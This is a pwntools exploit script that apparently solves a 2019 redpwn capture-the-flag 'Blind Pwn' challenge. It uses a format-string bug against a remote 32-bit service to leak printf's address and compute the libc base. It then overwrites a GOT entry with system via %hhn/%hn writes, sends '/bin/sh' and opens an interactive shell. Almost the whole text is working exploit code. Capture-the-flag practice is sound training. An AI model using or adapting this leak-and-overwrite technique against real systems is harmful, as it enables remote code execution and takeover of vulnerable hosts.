###Blind Pwn
#  libc2.23


from pwn import *


system_offset = 0x3a940
printf_base = 0x49020

r = remote('chall.2019.redpwn.net',4007)
#r.sendline('%3$s')
#print(r.recv())
#for i in range(1,10):
#    r.sendline(f'%{i}$p')
#    print(r.recvline())
#r.sendline(b'%10$s'.ljust(12,b'a')+p32(0x8048510))
r.sendline(b'%10$s'.ljust(12,b'a')+p32(0x804a008))
a = r.recv()
for i in range(5):
    print(hex(u32(a[i*4:i*4+4])))
printf_addr = u32(a[8:12])
libc_base = printf_addr-printf_base
print(hex(libc_base))
mid = ((libc_base+system_offset)&0xffff00)>>8
print(hex(mid))
payload = f'%{0x40}c%15$hhn%{mid-0x40}c%16$hn'.encode().ljust(32,b'a')+p32(0x804a010)+p32(0x804a011)
#payload = f'%{0x40}c%15$hhn%{mid-0x40}c%16$hn'.encode().ljust(32,b'a')+p32(0x804a00c)+p32(0x804a00d)
print(payload)
r.sendline(payload)
r.sendline('/bin/sh\x00')
input()
r.interactive()
